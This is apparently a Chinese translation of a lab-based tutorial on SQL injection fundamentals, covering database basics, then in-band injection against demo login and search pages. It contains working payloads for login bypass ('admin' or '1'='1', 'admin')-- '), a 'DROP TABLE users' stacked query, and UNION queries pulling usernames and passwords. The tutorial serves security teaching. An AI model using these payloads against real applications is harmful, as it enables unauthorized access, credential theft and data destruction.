---
title: SQL INJECTION FUNDAMENTALS
tags: Injection Cybersecurit 数据库安全
date: 2023-05-02 10:52:32
---

## 0x01 介绍

大多数现代 Web 应用程序在后端使用数据库结构。此类数据库用于存储和检索与 Web 应用程序相关的数据，从实际 Web 内容到用户信息和内容等。为了使 Web 应用程序动态化，Web 应用程序必须与数据库实时交互。当来自用户的 HTTP(S) 请求到达时，Web 应用程序的后端将向数据库发出查询以构建响应。这些查询可以包括来自 HTTP(S) 请求的信息或其他相关信息。

![数据库管理系统架构](https://p.ipic.vip/oxdmae.png)

当用户提供的信息用于构造对数据库的查询时，恶意用户可以诱使查询用于原始程序员预期之外的其他用途，从而使用称为 SQL 注入的攻击为用户提供查询数据库的权限（ SQLi).

SQL 注入是指针对关系数据库的攻击，例如`MySQL`（而非关系数据库的注入，例如 MongoDB，是 NoSQL 注入）。本模块将重点`MySQL`介绍 SQL 注入概念。

------

### SQL 注入 (SQLi)

Web 应用程序中可能存在许多类型的注入漏洞，例如 HTTP 注入、代码注入和命令注入。然而，最常见的例子是 SQL 注入。当恶意用户试图传递更改 Web 应用程序发送到数据库的最终 SQL 查询的输入时，就会发生 SQL 注入，从而使用户能够直接对数据库执行其他意外的 SQL 查询。

有很多方法可以做到这一点。要使 SQL 注入发挥作用，攻击者必须首先注入 SQL 代码，然后通过更改原始查询或执行全新的查询来颠覆 Web 应用程序逻辑。首先，攻击者必须在预期的用户输入限制之外注入代码，因此它不会作为简单的用户输入来执行。在最基本的情况下，这是通过注入单引号 ( `'`) 或双引号 ( `"`) 来避开用户输入的限制并将数据直接注入 SQL 查询来完成的。

一旦攻击者可以注入，他们就必须寻找一种方法来执行不同的 SQL 查询。这可以通过使用 SQL 代码来组成一个工作查询来完成，该查询可以同时执行预期的 SQL 查询和新的 SQL 查询。有很多方法可以实现这一点，例如使用[堆叠](https://www.sqlinjection.net/stacked-queries/)查询或使用[联合](https://www.mysqltutorial.org/sql-union-mysql.aspx/)查询。最后，要检索新查询的输出，我们必须在 Web 应用程序的前端对其进行解释或捕获。

------

### 用例和影响

SQL 注入可能会产生巨大的影响，尤其是在后端服务器和数据库的权限非常松懈的情况下。

首先，我们可能会检索我们不应该看到的秘密/敏感信息，例如用户登录名和密码或信用卡信息，然后可以将其用于其他恶意目的。SQL 注入导致许多网站密码和数据泄露，这些网站随后被重新用于窃取用户帐户、访问其他服务或执行其他恶意操作。

SQL 注入的另一个用例是破坏预期的 Web 应用程序逻辑。最常见的示例是在不传递有效的用户名和密码凭据对的情况下绕过登录。另一个例子是访问锁定给特定用户的功能，比如管理面板。攻击者还可以直接在后台服务器上读写文件，进而在后台服务器上设置后门，直接控制后台服务器，最终控制整个后台服务器。网站。

------

### 预防

SQL 注入通常是由编码不当的 Web 应用程序或不安全的后端服务器和数据库权限引起的。稍后，我们将讨论通过安全编码方法（例如用户输入清理和验证以及适当的后端用户权限和控制）来减少易受 SQL 注入攻击的机会的方法。

## 0x02 数据库简介

在我们了解 SQL 注入之前，我们需要更多地了解数据库和结构化查询语言 (SQL)，哪些数据库将执行必要的查询。网络应用程序利用后端数据库来存储与网络应用程序相关的各种内容和信息。这可以是核心 Web 应用程序资产，如图像和文件、内容（如帖子和更新）或用户数据（如用户名和密码）。

有许多不同类型的数据库，每一种都适合特定的用途。传统上，应用程序使用基于文件的数据库，随着大小的增加，速度非常慢。`Database Management Systems`这导致了( )的采用`DBMS`。

------

### 数据库管理系统

数据库管理系统 (DBMS) 有助于创建、定义、托管和管理数据库。随着时间的推移，设计了各种 DBMS，例如基于文件、关系 DBMS (RDBMS)、NoSQL、基于图形和键/值存储。

有多种方式可以与 DBMS 交互，例如命令行工具、图形界面，甚至 API（应用程序编程接口）。DBMS 用于各种银行、金融和教育部门以记录大量数据。DBMS 的一些基本特征包括：

| **特征**                    | **描述**                                                     |
| --------------------------- | ------------------------------------------------------------ |
| `Concurrency`               | 一个真实世界的应用程序可能有多个用户同时与之交互。DBMS 确保这些并发交互成功而不会损坏或丢失任何数据。 |
| `Consistency`               | 对于如此多的并发交互，DBMS 需要确保数据在整个数据库中保持一致和有效。 |
| `Security`                  | DBMS 通过用户身份验证和权限提供细粒度的安全控制。这将防止未经授权查看或编辑敏感数据。 |
| `Reliability`               | 备份数据库并在数据丢失或破坏的情况下将它们回滚到以前的状态很容易。 |
| `Structured Query Language` | SQL 通过支持各种操作的直观语法简化了用户与数据库的交互。     |

------

### 架构

下图详细说明了一个两层架构。

![数据库管理系统架构](https://p.ipic.vip/jadjj1.png)

`Tier I`通常由客户端应用程序组成，例如网站或 GUI 程序。这些应用程序由高级交互组成，例如用户登录或评论。`Tier II`来自这些交互的数据通过 API 调用或其他请求传递。

第二层是中间件，它解释这些事件并将它们放入 DBMS 所需的格式中。最后，应用层根据 DBMS 的类型使用特定的库和驱动程序与它们进行交互。DBMS 从第二层接收查询并执行请求的操作。这些操作可能包括数据的插入、检索、删除或更新。处理后，DBMS 返回任何请求的数据或错误代码以应对无效查询。

可以在同一台主机上托管应用程序服务器和 DBMS。但是，具有支持许多用户的大量数据的数据库通常单独托管以提高性能和可伸缩性。

## 0x03 数据库类型

一般来说，数据库分为`Relational Databases`和`Non-Relational Databases`。只有关系数据库使用 SQL，而非关系数据库使用多种通信方法。

------

### 关系数据库

关系数据库是最常见的数据库类型。它使用模式、模板来指示存储在数据库中的数据结构。例如，我们可以想象一家向其客户销售产品的公司拥有关于这些产品的去向、销售对象和数量的某种形式的存储知识。然而，这通常是在后端完成的，而在前端没有明显的通知。每种方法都可以使用不同类型的关系数据库。例如，第一个表可以存储和显示基本的客户信息，第二个表可以存储销售的产品数量及其成本，第三个表可以列举谁购买了这些产品以及支付数据。

关系数据库中的表与提供快速数据库摘要或在需要查看特定数据时访问特定行或列的键相关联。这些表，也称为实体，都相互关联。例如，客户信息表可以为每个客户提供一个特定的 ID，该 ID 可以指示我们需要了解的有关该客户的所有信息，例如地址、姓名和联系信息。此外，产品描述表可以为每个产品分配一个特定的 ID。存储所有订单的表只需要记录这些 ID 及其数量。这些表格中的任何更改都会影响所有这些表格，但可以预见和系统地影响。

`relational database management system`但是，在处理集成数据库时，需要一个概念，即使用称为( )的键将一个表链接到另一个表`RDBMS`。许多最初使用不同概念的公司正在转向 RDBMS 概念，因为这个概念易于学习、使用和理解。最初，这个概念只被大公司使用。然而，许多类型的数据库现在都实现了 RDBMS 概念，例如 Microsoft Access、MySQL、SQL Server、Oracle、PostgreSQL 等等。

例如，我们可以`users`在关系数据库中有一个表，其中包含`id`、`username`、`first_name`、`last_name`和其他列。可以`id`用作表键。另一个表`posts`可能包含所有用户发布的帖子，列有`id`、`user_id`、`date`、`content`等。

![HTML范例](https://p.ipic.vip/ko5y8y.jpg)

我们可以将表中的`id`from链接`users`到`user_id`表中`posts`以检索每个帖子的用户详细信息，而无需存储每个帖子的所有用户详细信息。一个表可以有多个键，因为另一列可以用作键来链接另一个表。因此，例如，该`id`列可以用作将`posts`表链接到另一个包含评论的表的键，每个评论都属于一个特定的帖子，等等。

数据库中表之间的关系称为模式。

这样，通过使用关系数据库，可以快速轻松地从所有数据库中检索有关特定元素的所有数据。因此，例如，我们可以使用单个查询从所有表中检索链接到特定用户的所有详细信息。这使得关系数据库对于具有清晰结构和设计以及高效数据管理的大数据集非常快速和可靠。关系数据库最常见的示例是`MySQL`，我们将在本模块中介绍。

------

### 非关系数据库

非关系数据库（也称为`NoSQL`数据库）不使用表、行和列或主键、关系或模式。相反，NoSQL 数据库根据存储的数据类型使用各种存储模型来存储数据。由于没有为数据库定义的结构，NoSQL 数据库具有很强的可扩展性和灵活性。因此，在处理定义和结构不是很好的数据集时，NoSQL 数据库将是存储此类数据的最佳选择。NoSQL 数据库有四种常见的存储模型：

- 核心价值
- 基于文档
- 宽栏
- 图形

上述每个模型都有不同的数据存储方式。例如，该`Key-Value`模型通常以 JSON 或 XML 格式存储数据，每一对都有一个键，并将其所有数据存储为它的值： ![HTML范例](https://p.ipic.vip/m6b9rg.jpg)

上面的示例可以使用 JSON 表示为：

```json
{
  "100001": {
    "date": "01-01-2021",
    "content": "Welcome to this web application."
  },
  "100002": {
    "date": "02-01-2021",
    "content": "This is the first post on this web app."
  },
  "100003": {
    "date": "02-01-2021",
    "content": "Reminder: Tomorrow is the ..."
  }
}
```

它看起来类似于`Python`or `PHP`（即`{'key':'value'}`）等语言中的字典项，其中 the`key`通常是字符串，而 the`value`可以是字符串、字典或任何类对象。

NoSQL 数据库最常见的示例是`MongoDB`.

## 0x04 SQL 注入简介

### 在 Web 应用程序中使用 SQL

首先，让我们看看 Web 应用程序如何使用 MySQL 数据库来存储和检索数据。一旦在后端服务器上安装并设置了 DBMS 并启动并运行，Web 应用程序就可以开始利用它来存储和检索数据。

例如，在`PHP`Web 应用程序中，我们可以连接到我们的数据库，并`MySQL`通过`MySQL`语法开始使用数据库，就在 中`PHP`，如下所示：

```php
$conn = new mysqli("localhost", "root", "password", "users");
$query = "select * from logins";
$result = $conn->query($query);
```

然后，查询的输出将存储在 中`$result`，我们可以将其打印到页面或以任何其他方式使用它。下面的 PHP 代码将在新行中打印 SQL 查询的所有返回结果：

```php
while($row = $result->fetch_assoc() ){
	echo $row["name"]."<br>";
}
```

Web 应用程序在检索数据时通常也使用用户输入。例如，当用户使用搜索功能搜索其他用户时，他们的搜索输入将传递给 Web 应用程序，该应用程序使用输入在数据库中进行搜索：

```php
$searchInput =  $_POST['findUser'];
$query = "select * from logins where username like '%$searchInput'";
$result = $conn->query($query);
If we use user-input within an SQL query, and if not securely coded, it may cause a variety of issues, like SQL Injection vulnerabilities.
```

------

### 什么是注射？

在上面的示例中，我们接受用户输入并将其直接传递给 SQL 查询而不进行清理。

清理是指删除用户输入中的任何特殊字符，以中断任何注入尝试。

当应用程序将用户输入错误解释为实际代码而不是字符串时，就会发生注入，从而更改代码流并执行它。这可以通过注入特殊字符（如 ( `'`)）来转义用户输入边界，然后编写要执行的代码（如 JavaScript 代码或 SQL 注入中的 SQL）来实现。除非对用户输入进行清理，否则很可能会执行注入的代码并运行它。

------

### SQL注入

当用户输入被输入到 SQL 查询字符串中而没有正确清理或过滤输入时，就会发生 SQL 注入。前面的示例展示了如何在 SQL 查询中使用用户输入，并且它没有使用任何形式的输入清理：

```php
$searchInput =  $_POST['findUser'];
$query = "select * from logins where username like '%$searchInput'";
$result = $conn->query($query);
```

在典型情况下，`searchInput`将输入 以完成查询，返回预期结果。我们键入的任何输入都会进入以下 SQL 查询：

```sql
select * from logins where username like '%$searchInput'
```

所以，如果我们输入`admin`，它变成`'%admin'`。在这种情况下，如果我们编写任何 SQL 代码，它只会被视为搜索词。例如，如果我们输入`SHOW DATABASES;`，它将被执行为`'%SHOW DATABASES;'`Web 应用程序将搜索类似于 的用户名`SHOW DATABASES;`。但是，由于没有清理，在这种情况下，**我们可以添加一个单引号 ( `'`)，它将结束用户输入字段，然后我们可以编写实际的 SQL 代码**。例如，如果我们搜索`1'; DROP TABLE users;`，搜索输入将是：

```php
'%1'; DROP TABLE users;'
```

请注意我们如何在“1”之后添加单引号 (')，以避开用户输入 ('%$searchInput') 的范围。

因此，最终执行的 SQL 查询如下：

```sql
select * from logins where username like '%1'; DROP TABLE users;'
```

正如我们从语法突出显示中看到的那样，我们可以转义原始查询的边界并执行新注入的查询。`Once the query is run, the `用户` table will get deleted.`

注意：在上面的示例中，为了简单起见，我们在分号（;）之后添加了另一个 SQL 查询。虽然这对于 MySQL 实际上是不可能的，但对于 MSSQL 和 PostgreSQL 是可能的。在接下来的部分中，我们将讨论在 MySQL 中注入 SQL 查询的真正方法。

------

### 语法错误

前面的 SQL 注入示例将返回错误：

```php
Error: near line 1: near "'": syntax error
```

这是因为最后一个尾随字符，我们有一个`'`没有关闭的额外引号 ()，这会导致执行时出现 SQL 语法错误：

```sql
select * from logins where username like '%1'; DROP TABLE users;'
```

在这种情况下，我们只有一个尾随字符，因为我们的搜索查询输入接近 SQL 查询的末尾。然而，用户输入通常在 SQL 查询的中间，原始 SQL 查询的其余部分在它之后。

要成功注入，我们必须确保新修改的 SQL 查询在注入后仍然有效并且没有任何语法错误。在大多数情况下，我们无法访问源代码来查找原始 SQL 查询并开发适当的 SQL 注入来进行有效的 SQL 查询。那么，我们如何才能成功地注入到 SQL 查询中呢？

一个答案是使用`comments`，我们将在后面的部分讨论这个问题。另一种方法是通过传入多个单引号使查询语法起作用，我们将在接下来讨论 ( `'`)。

现在我们了解了 SQL 注入的基础知识，让我们开始学习一些实际用途。

------

### SQL注入的类型

SQL 注入根据我们检索其输出的方式和位置进行分类。

![数据库管理系统架构](https://p.ipic.vip/p4s9ku.jpg)

在简单的情况下，预期和新查询的输出可能会直接打印在前端，我们可以直接读取。这称为`In-band`SQL 注入，它有两种类型：`Union Based`和`Error Based`。

使用`Union Based`SQL 注入，我们可能必须指定我们可以读取的确切位置，即“列”，以便查询将输出定向到那里打印。至于SQL 注入，当我们可以在前端`Error Based`获取`PHP`或错误时使用它，因此我们可能会故意导致返回查询输出的 SQL 错误。`SQL`

在更复杂的情况下，我们可能无法打印输出，因此我们可以利用 SQL 逻辑逐个字符地检索输出。这称为`Blind`SQL 注入，它也有两种类型：`Boolean Based`和`Time Based`。

通过`Boolean Based`SQL 注入，我们可以使用 SQL 条件语句来控制页面是否返回任何输出，“即原始查询响应”，如果我们的条件语句返回`true`。对于`Time Based`SQL 注入，我们使用 SQL 条件语句，如果条件语句`true`使用`Sleep()`函数返回，则延迟页面响应。

最后，在某些情况下，我们可能无法直接访问输出，因此我们可能必须将输出定向到远程位置，“即 DNS 记录”，然后尝试从那里检索它。这称为`Out-of-band`SQL 注入。

在本模块中，我们将只专注于通过学习 SQL 注入来介绍`Union Based`SQL 注入。

## 0x05 颠覆查询逻辑

------

现在我们对 SQL 语句的工作原理有了基本的了解，让我们开始 SQL 注入。在我们开始执行整个 SQL 查询之前，我们将首先学习通过注入运算符`OR`和使用 SQL 注释来颠覆原始查询逻辑来修改原始查询。这方面的一个基本示例是绕过 Web 身份验证，我们将在本节中对此进行演示。

------

### 身份验证绕过

考虑以下管理员登录页面。

![管理面板](https://p.ipic.vip/v1wx7o.png)

我们可以使用管理员凭据登录`admin / p@ssw0rd`。

![admin_creds](https://p.ipic.vip/rr2k1g.png)

该页面还显示了正在执行的 SQL 查询，以便更好地了解我们将如何颠覆查询逻辑。我们的目标是在不使用现有密码的情况下以管理员用户身份登录。正如我们所见，当前正在执行的 SQL 查询是：

```sql
SELECT * FROM logins WHERE username='admin' AND password = 'p@ssw0rd';
```

该页面接收凭据，然后使用`AND`运算符选择与给定用户名和密码匹配的记录。如果`MySQL`数据库返回匹配的记录，则凭据有效，因此代码`PHP`会将登录尝试条件评估为`true`。如果条件评估为`true`，则返回管理员记录，并验证我们的登录。让我们看看当我们输入错误的凭据时会发生什么。

![管理员不正确](https://p.ipic.vip/wiuu1q.png)

不出所料，由于密码错误导致`false`操作结果导致登录失败`AND`。

------

### SQLi 发现

在我们开始破坏 Web 应用程序的逻辑并试图绕过身份验证之前，我们首先必须测试登录表单是否容易受到 SQL 注入的攻击。为此，我们将尝试在我们的用户名后添加以下有效负载之一，看看它是否会导致任何错误或改变页面的行为方式：

| 有效载荷 | 网址编码 |
| -------- | -------- |
| `'`      | `%27`    |
| `"`      | `%22`    |
| `#`      | `%23`    |
| `;`      | `%3B`    |
| `)`      | `%29`    |

注意：在某些情况下，我们可能必须使用负载的 URL 编码版本。这方面的一个例子是当我们将我们的有效负载直接放在 URL“即 HTTP GET 请求”中时。

因此，让我们从注入单引号开始：

![报价错误](https://p.ipic.vip/j8ps1w.png)

我们看到抛出了 SQL 错误而不是`Login Failed`消息。该页面引发错误，因为生成的查询是：

```sql
SELECT * FROM logins WHERE username=''' AND password = 'something';
```

如上一节所述，我们输入的引号导致了奇数个引号，从而导致语法错误。一种选择是注释掉查询的其余部分，并将查询的其余部分作为我们注入的一部分来编写，以形成一个有效的查询。另一种选择是在我们注入的查询中使用偶数个引号，这样最终的查询仍然有效。

------

### 或注射

`true`无论输入的用户名和密码如何，我们都需要查询始终返回，以绕过身份验证。为此，我们可以`OR`在 SQL 注入中滥用运算符。

如前所述，[操作优先级的](https://dev.mysql.com/doc/refman/8.0/en/operator-precedence.html)MySQL 文档指出`AND`操作符将在操作符之前被评估`OR`。`TRUE`这意味着如果整个查询中至少有一个条件和一个`OR`运算符，则整个查询的计算结果将是 to `TRUE`，因为如果其操作数之一是 ，`OR`则运算符返回。`TRUE``TRUE`

始终返回的条件示例`true`是`'1'='1'`。但是，为了保持 SQL 查询正常工作并保持偶数个引号，而不是使用 ('1'='1')，我们将删除最后一个引号并使用 ('1'='1)，因此剩下的单引号原始查询中的引用将取而代之。

因此，如果我们注入以下条件并`OR`在它和原始条件之间有一个运算符，它应该总是返回`true`：

```sql
admin' or '1'='1
```

最终查询应如下所示：

```sql
SELECT * FROM logins WHERE username='admin' or '1'='1' AND password = 'something';
```

这意味着以下内容：

- 如果用户名是`admin`
  `OR`
- 如果`1=1`返回`true`'总是返回`true`'
  `AND`
- 如果密码是`something`

![or_inject_diagram](https://p.ipic.vip/z4rxm0.png)

运算`AND`符将首先被评估，然后返回`false`。然后，`OR`运算符将被评估，如果其中一个语句是`true`，它将返回`true`。由于`1=1`总是返回`true`，此查询将返回`true`，并且它会授予我们访问权限。

注意：我们上面使用的有效载荷是我们可以用来破坏身份验证逻辑的众多身份验证绕过有效载荷之一。[您可以在PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL Injection#authentication-bypass)中找到完整的 SQLi 身份验证绕过负载列表，每个负载都适用于特定类型的 SQL 查询。

------

### 使用 OR 运算符绕过身份验证

让我们尝试将此作为用户名并查看响应。 ![注入成功](https://p.ipic.vip/axfg4d.png)

我们能够以管理员身份成功登录。但是，如果我们不知道有效的用户名怎么办？这次让我们用不同的用户名尝试相同的请求。

![notadmin_fail](https://p.ipic.vip/227o29.png)

登录失败，因为`notAdmin`表中不存在，导致整体查询错误。

![notadmin_diagram](https://p.ipic.vip/l1tx6e.png)

要再次成功登录，我们需要一个整体`true`查询。这可以通过`OR`在密码字段中注入一个条件来实现，因此它总是会返回`true`。让我们尝试`something' or '1'='1`作为密码。

![密码或注入](https://p.ipic.vip/6me5id.png)

附加`OR`条件导致`true`整体查询，因为该`WHERE`子句返回表中的所有内容，并且第一行中的用户已登录。在这种情况下，由于两个条件都将返回，`true`我们不必提供测试用户名和密码，可以直接开始注入`'`，直接用`' or '1' = '1`.

![basic_auth_bypass](https://p.ipic.vip/a4r69u.png)

这是有效的，因为查询的计算结果与`true`用户名或密码无关。

## 0x06 使用注释

本节将介绍如何使用注释来颠覆更高级的 SQL 查询的逻辑，并最终得到一个有效的 SQL 查询来绕过登录身份验证过程。

------

### 注释

就像任何其他语言一样，SQL 也允许使用注释。注释用于记录查询或忽略查询的特定部分。除了内联注释外，我们还可以在 MySQL`-- `和中使用两种类型的行注释（尽管这通常不用于 SQL 注入）。可以按如下方式使用：`#``/**/``--`

```shell-session
mysql> SELECT username FROM logins; -- Selects usernames from the logins table 

+---------------+
| username      |
+---------------+
| admin         |
| administrator |
| john          |
| tom           |
+---------------+
4 rows in set (0.00 sec)
```

注意：在 SQL 中，仅使用两个破折号不足以开始注释。所以，它们后面必须有一个空格，所以注释以 (-- ) 开头，末尾有一个空格。有时 URL 编码为 (--+)，因为 URL 中的空格被编码为 (+)。为清楚起见，我们将在末尾 (-- -) 添加另一个 (-)，以显示空格字符的使用。

符号`#`也可以使用。

```shell-session
mysql> SELECT * FROM logins WHERE username = 'admin'; ## You can place anything here AND password = 'something'

+----+----------+----------+---------------------+
| id | username | password | date_of_joining     |
+----+----------+----------+---------------------+
|  1 | admin    | p@ssw0rd | 2020-07-02 00:00:00 |
+----+----------+----------+---------------------+
1 row in set (0.00 sec)
```

提示：如果您在浏览器的 URL 中输入有效负载，(#) 符号通常被视为标记，不会作为 URL 的一部分传递。为了在浏览器中使用 (#) 作为注释，我们可以使用 '%23'，这是一个 URL 编码 (#) 符号。

服务器将在评估期间忽略查询的部分`AND password = 'something'`。

------

### 带有注释的身份验证绕过

让我们回到我们之前的例子并注入`admin'-- `我们的用户名。最终查询将是：

```sql
SELECT * FROM logins WHERE username='admin'-- ' AND password = 'something';
```

正如我们从语法突出显示中看到的那样，用户名现在是`admin`，查询的其余部分现在作为注释被忽略。此外，通过这种方式，我们可以确保查询没有任何语法问题。

`admin'-- `让我们尝试在登录页面上使用这些，并使用用户名和任何密码登录：

![admin_dash](https://p.ipic.vip/sqgtxx.png)

如我们所见，我们能够绕过身份验证，因为新修改的查询会检查用户名，没有其他条件。

------

### 另一个例子

如果应用程序需要先检查特定条件，SQL 支持使用括号。括号内的表达式优先于其他运算符并首先计算。让我们来看这样一个场景：

![paranthesis_fail](https://p.ipic.vip/7qr0qc.png)

上面的查询确保用户的 id 总是大于 1，这将阻止任何人以管理员身份登录。此外，我们还看到密码在用于查询之前已经过哈希处理。这将阻止我们通过密码字段进行注入，因为输入已更改为哈希。

让我们尝试使用有效凭据登录`admin / p@ssw0rd`以查看响应。

![paranthesis_valid_fail](https://p.ipic.vip/fa2q4c.png)

正如预期的那样，即使我们提供了有效的凭据，登录也会失败，因为管理员的 ID 等于 1。因此让我们尝试使用另一个用户的凭据登录，例如`tom`。

![tom_login](https://p.ipic.vip/r9086n.png)

以 id 不等于 1 的用户身份登录成功。那么，我们如何以管理员身份登录呢？从前面关于注释的部分我们知道我们可以使用它们来注释查询的其余部分。因此，让我们尝试使用`admin'-- `as 用户名。

![paranthesis_error](https://p.ipic.vip/e5z9ah.png)

由于语法错误，登录失败，因为关闭的没有平衡开括号。要成功执行查询，我们必须添加一个右括号。让我们尝试使用用户名`admin')-- `关闭并注释掉其余部分。

![paranthesis_success](https://p.ipic.vip/tf4imk.png)

查询成功，我们以管理员身份登录。我们输入的最终查询是：

```sql
SELECT * FROM logins where (username='admin')
```

## 0x07 Union Clause

到目前为止，我们只是在操纵原始查询来颠覆 Web 应用程序逻辑并绕过身份验证，使用运算符`OR`和注释。然而，另一种类型的 SQL 注入是注入与原始查询一起执行的整个 SQL 查询。本节将通过使用 MySQL`Union`子句来演示这一点`SQL Union Injection`。

------

### Union

在开始学习 Union Injection 之前，我们应该先了解一下 SQL Union 子句。[Union](https://dev.mysql.com/doc/refman/8.0/en/union.html)子句用于组合多个`SELECT`语句的结果。这意味着通过`UNION`注入，我们将能够`SELECT`从多个表和数据库中跨 DBMS 转储和转储数据。让我们尝试`UNION`在示例数据库中使用运算符。首先，让我们看一下表的内容`ports`：

```shell-session
mysql> SELECT * FROM ports;

+----------+-----------+
| code     | city      |
+----------+-----------+
| CN SHA   | Shanghai  |
| SG SIN   | Singapore |
| ZZ-21    | Shenzhen  |
+----------+-----------+
3 rows in set (0.00 sec)
```

接下来，让我们看看表的输出`ships`：

```shell-session
mysql> SELECT * FROM ships;

+----------+-----------+
| Ship     | city      |
+----------+-----------+
| Morrison | New York  |
+----------+-----------+
1 rows in set (0.00 sec)
```

现在，让我们尝试使用`UNION`组合两个结果：

```shell-session
mysql> SELECT * FROM ports UNION SELECT * FROM ships;

+----------+-----------+
| code     | city      |
+----------+-----------+
| CN SHA   | Shanghai  |
| SG SIN   | Singapore |
| Morrison | New York  |
| ZZ-21    | Shenzhen  |
+----------+-----------+
4 rows in set (0.00 sec)
```

如我们所见，`UNION`将两个语句的输出合并`SELECT`为一个，因此表中的条目`ports`和`ships`表中的条目合并为具有四行的单个输出。正如我们所看到的，一些行属于表，`ports`而另一些行属于`ships`表。

注意：所有位置上所选列的数据类型应相同。

------

### 偶数列

一条`UNION`语句只能对`SELECT`具有相同列数的语句进行操作。例如，如果我们尝试`UNION`两个具有不同列数的结果的查询，我们会收到以下错误：

```shell-session
mysql> SELECT city FROM ports UNION SELECT * FROM ships;

ERROR 1222 (21000): The used SELECT statements have a different number of columns
```

上面的查询导致错误，因为第一个`SELECT`返回一列而第二个`SELECT`返回两列。一旦我们有两个返回相同列数的查询，我们就可以使用`UNION`运算符从其他表和数据库中提取数据。

例如，如果查询是：

```sql
SELECT * FROM products WHERE product_id = 'user_input'
```

我们可以`UNION`在输入中注入一个查询，以便返回另一个表中的行：

```sql
SELECT * from products where product_id = '1' UNION SELECT username, password from passwords-- '
```

假设表有两列，上述查询将返回`username`表`password`中的条目。`passwords``products`

------

### 非偶数列

我们会发现原始查询的列数通常与我们要执行的 SQL 查询的列数不同，因此我们必须解决这个问题。例如，假设我们只有一列。在这种情况下，我们希望`SELECT`，我们可以为剩余的必需列放置垃圾数据，以便我们正在处理的列总数`UNION`与原始查询相同。

例如，我们可以使用任何字符串作为垃圾数据，查询将返回该字符串作为该列的输出。如果我们`UNION`使用字符串`"junk"`，`SELECT`则查询`SELECT "junk" from passwords`将始终返回`junk`。我们也可以使用数字。例如，查询`SELECT 1 from passwords`将始终`1`作为输出返回。

注意：在用垃圾数据填充其他列时，必须保证数据类型与该列的数据类型匹配，否则查询会返回错误。为了简单起见，我们将使用数字作为我们的垃圾数据，这对于跟踪我们的有效载荷位置也很方便，我们将在后面讨论。

提示：对于高级 SQL 注入，我们可能只想使用 'NULL' 来填充其他列，因为 'NULL' 适合所有数据类型。

`products`上面例子中的表有两列，所以我们必须有`UNION`两列。如果我们只想得到一列“eg `username`”，我们必须这样做`username, 2`，这样我们就有相同数量的列：

```sql
SELECT * from products where product_id = '1' UNION SELECT username, 2 from passwords
```

如果我们在原始查询的表中有更多的列，我们必须添加更多的数字来创建剩余的所需列。例如，如果原始查询用于`SELECT`具有四列的表，我们的`UNION`注入将是：

```sql
UNION SELECT username, 2, 3, 4 from passwords-- '
```

此查询将返回：

```shell-session
mysql> SELECT * from products where product_id UNION SELECT username, 2, 3, 4 from passwords-- '

+-----------+-----------+-----------+-----------+
| product_1 | product_2 | product_3 | product_4 |
+-----------+-----------+-----------+-----------+
|   admin   |    2      |    3      |    4      |
+-----------+-----------+-----------+-----------+
```

正如我们所见，我们想要的 ' `UNION SELECT username from passwords`' 查询输出位于第二行的第一列，而数字填充了其余列。

## 0x08 Union Injection

现在我们知道 Union 子句是如何工作的以及如何使用它让我们学习如何在我们的 SQL 注入中使用它。让我们来看下面的例子：

![img](https://p.ipic.vip/5yfxhm.png)

我们在搜索参数中看到了潜在的 SQL 注入。我们通过注入单引号 ( ) 来应用 SQLi Discovery 步骤`'`，但我们确实收到错误：

![img](https://p.ipic.vip/pabe77.png)

由于我们造成了错误，这可能意味着该页面容易受到 SQL 注入攻击。这种情况非常适合通过基于联合的注入进行利用，因为我们可以看到我们的查询结果。

------

### 检测列数

在继续使用基于联合的查询之前，我们需要找到服务器选择的列数。有两种检测列数的方法：

- 使用`ORDER BY`
- 使用`UNION`

##### 使用 ORDER BY

检测列数的第一种方法是通过`ORDER BY`我们之前讨论过的函数。我们必须注入一个查询，该查询按我们指定的列对结果进行排序，“即第 1 列、第 2 列等等”，直到我们收到一个错误，指出指定的列不存在。

例如，我们可以从 开始`order by 1`，按第一列排序，然后成功，因为表必须至少有一个列。然后我们会做`order by 2`，然后`order by 3`直到我们到达一个返回错误的数字，或者页面没有显示任何输出，这意味着这个列号不存在。我们成功排序的最终成功列为我们提供了列总数。

如果我们在 处失败`order by 4`，这意味着该表有三列，这是我们能够成功排序的列数。让我们回到之前的示例并尝试使用以下有效负载进行相同的操作：

```sql
' order by 1-- -
```

提醒：我们在末尾添加了一个额外的破折号 (-)，以向您表明 (--) 之后有一个空格。

如我们所见，我们得到了一个正常的结果：

![img](https://p.ipic.vip/5yfxhm.png)

接下来，让我们尝试使用以下有效负载按第二列排序：

```sql
' order by 2-- -
```

我们仍然得到结果。我们注意到它们的排序方式与预期的不同：

![img](https://p.ipic.vip/eo1va8.jpg)

`3`我们对 column和做同样的事情`4`并得到结果。但是，当我们尝试`ORDER BY`第 5 列时，出现以下错误：

![img](https://p.ipic.vip/d109h9.jpg)

这意味着该表恰好有 4 列。

##### 使用 UNION

另一种方法是尝试使用不同数量的列进行联合注入，直到我们成功取回结果。第一个方法总是返回结果，直到我们遇到错误，而这个方法总是给出错误，直到我们获得成功。我们可以从注入一个 3 列`UNION`查询开始：

```sql
cn' UNION select 1,2,3-- -
```

我们收到一条错误消息，指出列数不匹配：  

![img](https://p.ipic.vip/65slq5.png)

因此，让我们尝试四列并查看响应：

```sql
cn' UNION select 1,2,3,4-- -
```

![img](https://p.ipic.vip/sz9ia5.png)

这次我们成功得到了结果，这意味着该表再次具有 4 列。我们可以使用任何一种方法来确定列数。一旦我们知道了列数，我们就知道如何形成我们的有效载荷，我们可以继续下一步。

------

### 注射位置

虽然查询可能返回多列，但 Web 应用程序可能只显示其中的一部分。因此，如果我们将查询注入到页面上未打印的列中，我们将无法获得其输出。这就是为什么我们需要确定将哪些列打印到页面，以确定在何处放置我们的注入。在前面的示例中，虽然注入的查询返回 1、2、3 和 4，但我们在页面上只看到 2、3 和 4 作为输出数据返回给我们：

![img](https://p.ipic.vip/sz9ia5.png)

并非每一列都会显示给用户是很常见的。例如，ID 字段通常用于将不同的表链接在一起，但用户不需要看到它。这告诉我们打印了第 2 列、第 3 列和第 4 列以将我们的注入放置在其中任何一个中。`We cannot place our injection at the beginning, or its output will not be printed.`

这是使用数字作为我们的垃圾数据的好处，因为它可以很容易地跟踪打印了哪些列，因此我们知道在哪一列放置我们的查询。为了测试我们是否可以从数据库中获取“而不仅仅是数字”的实际数据，我们可以使用`@@version`SQL 查询作为测试并将其放在第二列而不是数字 2 中：

```sql
cn' UNION select 1,@@version,3,4-- -
```

![img](https://p.ipic.vip/egjoic.jpg)

